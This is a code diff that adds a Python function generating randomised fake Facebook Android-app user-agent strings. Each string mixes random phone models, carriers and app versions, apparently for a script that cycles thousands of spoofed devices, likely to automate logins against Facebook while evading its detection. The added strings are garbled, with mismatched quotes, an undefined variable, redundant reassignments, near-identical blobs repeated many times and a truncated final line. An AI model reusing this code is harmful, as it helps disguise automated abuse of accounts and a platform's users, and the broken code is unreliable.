@@ -294,6 +294,37 @@ for okdk in range(5000):
     ua = random.choice(uaall)
     #print(f' {B}|{G}USERAGENT{B}|{P} {ua}');time.sleep(2);sifat()
     SUMONapi.append(ua)
+def ua():
+    android_version = str(random.randint(4,13))
+    application_version = str(random.randint(100,420))+".0.0."+str(random.randint(11,99))+"."+str(random.randint(100,200))
+    application_version_code = str(random.randint(111111111,999999999))
+    density = random.uniform(1.0,4.0)
+    width = str(random.randint(720,1440))
+    height = str(random.randint(1280,2560))
+    fban = "FB"+str(random.randint(4,6))+"A"
+    fban = random.choice(['FB4A','FB5A','FB6A'])
+    fbpn = random.choice(['com.facebook.katana','com.facebook.orca','messenger-android','com.facebook.lite'])
+    density = random.choice(['2.0','2.25','2.75','3.0','3.25','3 75'])
+    fblc_code = random.choice(["en_US", "en_GB", "en_UK", "en_PK", "en_IN", "ur_PK", "hi_IN", "de_DE"])
+    vivo_model = random.choice(["Vivo X60 Pro", "Vivo V21", "Vivo Y20", "Vivo S9", "Vivo Y72", "Vivo X50 Pro", "Vivo V20", "Vivo Y51", "Vivo S7", "Vivo Y30"])
+    infinix_model = random.choice(["Infinix Zero 8", "Infinix Note 10 Pro", "Infinix Hot 10", "Infinix S5", "Infinix Hot 9", "Infinix Note 8", "Infinix Smart 4", "Infinix Hot 8", "Infinix S4"])
+    realme_model = random.choice(["Realme X50 Pro", "Realme 8 Pro", "Realme Narzo 30 Pro", "Realme C25", "Realme GT", "Realme 7 Pro", "Realme Narzo 20", "Realme C15", "Realme X7 Pro", "Realme 6i"])
+    redme_model = random.choice(["Redmi Note 10 Pro", "Redmi 9", "Redme Note 9 Pro", "Redmi 9A", "Redmi Note 8", "Redmi 9T", "Redmi Note 7", "Redmi 9C", "Redmi Note 10", "Redmi 8 "])
+    oppo_model = random.choice(["Oppo Find X3 Pro", "Oppo Reno 5 Pro", "Oppo A74", "Oppo F19 Pro", "Oppo A54", "Oppo Reno 4 Pro", "Oppo A15", "Oppo F17 Pro", "Oppo A53", "Oppo Reno 3 Pro"])
+    itel_model = random.choice(["Itel A37", "Itel Vision 2", "Itel P37", "Itel A56", "Itel A23 Pro", "Itel A48", "Itel S16", "Itel A25", "Itel A56 Pro", "Itel P36", "Itel S15", "Itel A16", "Itel A36", "Itel S13", "Itel A14", "Itel A52", "Itel A15", "Itel P33", "Itel S12", "Itel A44", "Itel A14 Max", "Itel P32", "Itel S11", "Itel A12", "Itel A23"])
+    nokia_model = random.choice(["Nokia 8.3 5G", "Nokia 5.4", "Nokia 3.4", "Nokia 2.4", "Nokia 8.1", "Nokia 7.2", "Nokia 6.2", "Nokia 5.3", "Nokia 4.2", "Nokia 3.2", "Nokia 2.3", "Nokia 1.4", "Nokia 9 PureView", "Nokia 8 Sirocco", "Nokia 7 Plus", "Nokia 6.1", "Nokia 5.1", "Nokia 3.1", "Nokia 2.2", "Nokia 1.3", "Nokia 9", "Nokia 8", "Nokia 7", "Nokia 6", "Nokia 5"])
+    samsung_model = random.choice(["Samsung Galaxy S21 Ultra", "Samsung Galaxy Note 20 Ultra", "Samsung Galaxy S20 FE", "Samsung Galaxy A52", "Samsung Galaxy A32", "Samsung Galaxy S10+", "Samsung Galaxy Note 10", "Samsung Galaxy A71", "Samsung Galaxy A12", "Samsung Galaxy M31", "Samsung Galaxy S9", "Samsung Galaxy A42", "Samsung Galaxy A22", "Samsung Galaxy A02", "Samsung Galaxy Z Fold 2", "Samsung Galaxy A51", "Samsung Galaxy A31", "Samsung Galaxy M21", "Samsung Galaxy S8", "Samsung Galaxy A72", "Samsung Galaxy A52 5G", "Samsung Galaxy A21s", "Samsung Galaxy M51", "Samsung Galaxy S7", "Samsung Galaxy Note 9"])
+    network_carrier = random.choice(["Airtel", "Jio", "Vi", "BSNL", "Reliance Communications", "Tata Decomo", "Idea Cellular", "MTNL", "Jazz", "Mobilink", "Telenor", "Zong", "Ufone", "Warid Telecom", "Grameen Phone", "Robi Axiata Limited", "Banglalink", "Teletalk", "Citycell", "Nepal Telecom", "Ncell", "Smart Cell", "MTS", "metro by T-Mobile", "T-Mobile", "Willkommen", "Verizon", "Unicom", "Telecom", "UTL"])
+    vivo_ua = f"'[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
+    infinix_ua = f"'[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
+    realme_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
+    redmi_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'"
+    oppo_ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(gtt)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + '[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162173;FBDM/{density=2.8125,width=1080,height=2136};FBLC/fi_FI;FBRV/526298101;FBCR/Telenor ;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1903;FBSV/12;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/286.0.0.48.112;FBBV/242171849;FBDM/{density=2.75,width=1080,height=2131};FBLC/pt_BR;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=1800};FBLC/en_US;FBRV/334698665;FBCR/3 Macau;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAC-L22;FBSV/8.0.0;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/279.0.0.43.120;FBBV/231021068;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/282.0.0.40.117;FBBV/236468732;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBRV/238430540;FBCR/Ufone;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 6.1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;][FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] 